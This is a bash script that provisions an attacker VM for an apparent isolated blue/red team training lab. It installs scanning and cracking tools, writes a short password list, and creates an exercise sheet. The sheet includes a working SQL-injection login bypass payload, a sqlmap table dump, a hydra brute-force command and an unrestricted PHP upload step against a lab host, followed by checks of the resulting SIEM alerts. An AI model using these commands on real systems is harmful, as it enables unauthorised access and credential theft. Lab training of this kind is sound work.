#!/usr/bin/env bash
# kali VM: the attacker on the RED network. Used for red team exercises
# against the target; nothing here is reachable from outside the lab.
set -euo pipefail
source /opt/minisoc/lib.sh

log "Installing attack tools"
apt_install nmap nikto sqlmap hydra gobuster curl

# Older builds of this lab shipped a dvwa-bruteforce.py workaround script -
# no longer needed since the current target app's login has no CSRF token
# for hydra to fight. Clean up the stale copy so a re-provisioned VM
# doesn't leave it lying around as a dead giveaway.
rm -f /home/vagrant/dvwa-bruteforce.py

# A small curated list, not full rockyou: fast enough for a live demo,
# still includes the real password so the exercise actually succeeds.
cat > /home/vagrant/passwords.txt <<'TXT'
123456
admin
letmein
qwerty
Welcome1
changeme
TXT
chown vagrant:vagrant /home/vagrant/passwords.txt

# Short cheat sheet for the first exercises
cat > /home/vagrant/EXERCISES.txt <<'TXT'
Mini-SOC red team exercises (target: 10.10.20.10)

target's front page (http://10.10.20.10/) is a normal-looking "Northgate
Defense Systems" site - no hint of a training app. The actual vulnerable
app - a small, hand-written internal "Employee Portal", not a known
training tool - is still there, just not linked from anywhere, and its
login credentials are never just handed to you either: both are found
the way they'd really happen, through recon, SQL injection or a brute
force.

1. Port scan:      nmap -sV 10.10.20.10
2. Web scan:       nikto -h http://10.10.20.10/
3. Find the hidden app: gobuster dir -u http://10.10.20.10/ \
                     -w /usr/share/wordlists/dirb/common.txt
                     (turns up /legacy/ - an old internal tool
                     nobody decommissioned)
4. SQL injection (bypass, no password needed):
                   curl -s -G http://10.10.20.10/legacy/login.php \
                     --data-urlencode "username=' UNION SELECT 1,'admin','x'-- -" \
                     --data-urlencode 'password=x'
                   or automate it: sqlmap -u "http://10.10.20.10/legacy/login.php?username=admin&password=x" \
                     --batch --dump -D portal -T users
5. Brute-force the login (alternative to SQLi): hydra -l admin -P ~/passwords.txt \
                     10.10.20.10 http-post-form \
                     '/legacy/login.php:username=^USER^&password=^PASS^:F=Login failed'
                   No CSRF token to fight here (unlike the old DVWA-based
                   version of this lab) - hydra just works.
6. File upload:    log in (either way above), then POST a .php file to
                     dashboard.php's upload form - no checks at all. The
                     Wazuh agent on target watches /var/www/html in real
                     time (FIM) and alerts the moment the file lands.
Then check what Suricata/Wazuh raised:
  - Wazuh dashboard (https://localhost:8444) -> Discover, index pattern
    "wazuh-alerts-*", filter by rule group "minisoc_ids" or "web".
  - DFIR-IRIS (https://localhost:8445): level >= 10 alerts become cases
    automatically, with your IP as an indicator and target as the asset.
See the README's "Red team exercise" section for the full walkthrough.
TXT
chown vagrant:vagrant /home/vagrant/EXERCISES.txt

rm -rf /tmp/minisoc-kali
log "Kali ready (10.10.66.10), exercises in ~/EXERCISES.txt"
